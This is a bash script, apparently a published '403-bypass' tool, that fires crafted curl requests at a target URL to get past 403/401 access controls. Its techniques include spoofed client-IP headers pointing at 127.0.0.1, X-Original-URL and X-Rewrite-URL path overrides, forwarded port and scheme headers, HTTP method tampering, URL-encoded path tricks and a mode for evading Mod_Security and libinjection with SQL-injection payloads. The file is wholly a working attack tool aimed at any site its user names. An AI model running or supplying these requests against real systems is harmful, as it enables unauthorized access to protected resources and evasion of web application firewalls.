#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "     ${cyan}- twitter.com/Dheerajmadhukar : @me_dheeraj${end}"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--header\t\t\tHeader Bypass\n">&2
		printf "\t--protocol\t\t\tProtocol Bypass\n">&2
		printf "\t--port\t\t\t\tPort Bypass\n">&2
		printf "\t--HTTPmethod\t\t\tHTTP Method Bypass\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2
		printf "\t--SQLi\t\t\t\tMod_Security & libinjection Bypass\n">&2
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function Header_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] HTTP Header Bypass"${end}
	echo -e ${blue}"----------------------"${end}
	#will remove "X-Originating-" "CF-Connecting_IP" invalid header properties
	headerProperties=("X-Originally-Forwarded-For" "X-Originating-" "X-Originating-IP" "True-Client-IP" "X-WAP-Profile" "Destination" "Proxy" 
		"CF-Connecting_IP" "CF-Connecting-IP")
	for property in ${headerProperties[@]}; do
		echo -n "${property} Payload: "
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "${property}: 127.0.0.1, 68.180.194.242" -L -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H '${property}: 127.0.0.1, 68.180.194.242' -L -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done

	domainPayloads=("Profile" "X-Arbitrary" "X-HTTP-DestinationURL" "X-Forwarded-Proto")
	for property in ${domainPayloads[@]}; do
		echo -n "${property} http:// Payload: "
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "${property}: http://${domain}" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H '${property}: http://${domain}' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done

	echo -n "Referer Payload:"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Referer: ${target}' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print

	echo -n "X-Custom-IP-Authorization Payload:"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
	
	nonProxyPayloads=("X-Custom-IP-Authorization" "X-Originating-IP" "X-Forwarded-For" "X-Remote-IP" "X-Client-IP" "X-Host" "X-Forwarded-Host" "X-ProxyUser-Ip" "Base-Url" "Client-IP" "Http-Url" "Proxy-Host" "Proxy-Url" "Real-Ip"
		"Redirect" "Referrer" "Request-Uri" "Uri" "Url" "X-Forward-For" "X-Forwarded-By" "X-Forwarded-For-Original"
		"X-Forwarded-Server" "X-Forwarded" "X-Forwarder-For" "X-Http-Destinationurl" "X-Http-Host-Override"
		"X-Original-Remote-Addr" "X-Proxy-Url" "X-Real-Ip" "X-Remote-Addr");
	for property in ${nonProxyPayloads[@]}; do
		echo -n "${property} Payload: "
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "${property}: 127.0.0.1" -L -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H '${property}: 127.0.0.1' -L -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done

	echo -n "X-Custom-IP-Authorization..;/ Payload"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}..;/" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}..;/' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print

	pathPayloads=("X-Original-URL" "X-Rewrite-URL" "Referer")
	for property in ${pathPayloads[@]}; do
		echo -n "${property} Payload: "
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "${property}: /${path}" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H '${property}: /${path}' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done
	
	echo -n "Content-Length Payload:"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Content-Length: 0' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print

	echo -n "X-OReferrer Payload:"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
	
}	
function Protocol_Bypass(){
	echo -e ${blue}"-------------------------"${end}
	echo -e ${cyan}"[+] Protocol Based Bypass"${end}
	echo -e ${blue}"-------------------------"${end}
	protocols=("http" "https")
	for item in ${protocols[@]}; do
		echo -n "${item^^} Scheme Payload:"
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "${item}://${domain}/${path}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -X GET '${item}://${domain}/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print

		echo -n "X-Forwarded-Scheme ${item^^} Payload:"
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: ${item}" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Scheme: ${item}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done
}	

function Port_Bypass(){
	echo -e ${blue}"-------------------------"${end}
	echo -e ${cyan}"[+] Port Based Bypass"${end}
	echo -e ${blue}"-------------------------"${end}

	ports=("443" "4443" "80" "8080" "8443")
	for port in ${ports[@]}; do
		echo -n "X-Forwarded-Port ${port} Payload:"
		code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: ${port}" -X GET "${target}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -L -H 'X-Forwarded-Port: ${port}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done
}

function HTTP_Method_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] HTTP Method Bypass"${end}
	echo -e ${blue}"----------------------"${end}
	httpVerbs=("GET" "POST" "OPTIONS" "PUT" "TRACE" "PATCH" "TRACK" "CONNECT" "UPDATE" "LOCK")
	for verb in ${httpVerbs[@]}; do
		echo -n "${verb} : "
		code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X ${verb})
		payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -X ${verb}\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done
}

function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	while read -r line; do
		echo "Payload [ ${line} ]:"
		code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}${line}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf '%s\n' "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${line}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
		print
	done < payloads/encode-bypass-payloads.txt

	echo -n "Payload: [ %20${path}%20/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20${path}%20/" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%20${path}%%%%20/' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print

	echo -n "Payload [%2e/${path} ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/${path}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e/${path}' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print

	echo -n "Payload [ ;${path}/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;${path}/" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;${path}/' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
}

function SQLi_libinjection(){
	echo -e ${blue}"---------------------------------------"${end}
	echo -e ${cyan}"[+] Mod_Security & libinjection Bypass "${end}
	echo -e ${blue}"---------------------------------------"${end}
	
	while read -r line; do
		echo "Payload [ ${line} ]:"
		code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/${item}" -L -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
		payload=$(printf '%s\n' "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -L -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
	done < payloads/SQLi-payloads.txt
}

function 403bypass(){ 
	Header_Bypass
	Protocol_Bypass
	Port_Bypass
	HTTP_Method_Bypass
	URL_Encode_Bypass
	SQLi_libinjection
}

function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f2- )
					domain=$(echo $2 | cut -d "/" -f1)
					shift
					;;
			## modes
			'--header')
				mode='header'
				;;
			'--protocol')
				mode='proto'
				;;
			'--port')
				mode='port'
				;;
			'--HTTPmethod')
				mode='HTTPmethod'
				;;
			'--encode')
				mode='encode'
				;;
			'--exploit')
				mode='exploit'
				;;
			'--SQLi')
				mode='sqli'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	if [ "${mode}" == 'header' ];then
			echo "header"
			banner
            Header_Bypass
            exit 0
    elif [ "${mode}" == 'proto' ];then
			echo "protocol"
			banner
        	Protocol_Bypass
        	exit 0
	elif [ "${mode}" == 'port' ];then
			echo "port"
			banner
        	Port_Bypass
        	exit 0
	elif [ "${mode}" == 'HTTPmethod' ];then
			echo "HTTPmethod"
			banner
        	HTTP_Method_Bypass
        	exit 0
	elif [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'sqli' ];then
			echo "SQLi"
			banner
			SQLi_libinjection
			exit 0 
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
